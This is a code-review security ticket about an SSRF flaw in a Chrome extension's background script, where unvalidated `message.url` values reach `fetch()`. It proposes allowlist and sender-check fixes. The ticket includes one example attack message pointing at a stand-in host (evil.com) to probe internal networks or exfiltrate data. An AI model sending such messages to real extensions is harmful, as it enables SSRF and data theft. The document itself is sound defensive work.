---
status: pending
priority: p1
issue_id: "012"
tags: [code-review, security, chrome]
---

# SSRF via unbounded URL fetch in Chrome extension background script

## Problem Statement

The Chrome extension background script (`packages/chrome/src/background.ts`) `fetchPsl` and `addSource` message handlers accept `message.url` from content scripts with zero validation. The service worker's `fetch()` can reach any HTTPS origin. A compromised content script on any matched host (Jira, Slack, GitHub, Linear) can send `{ type: "fetchPsl", url: "https://evil.com/..." }` to probe internal networks (SSRF) or exfiltrate data via URL parameters.

## Proposed Solutions

1. Validate `message.url` against a strict allowlist pattern (e.g., must match `https://raw.githubusercontent.com/` or `https://` with user-approved domains)
2. Check `sender.tab` and `sender.url` to verify messages come from expected content scripts
3. Reject any URL that does not match the allowlist with a clear error

## Acceptance Criteria

- [ ] `fetchPsl` and `addSource` handlers validate `message.url` against an allowlist
- [ ] `sender.tab` and `sender.url` are checked before processing messages
- [ ] Requests to non-allowlisted URLs are rejected
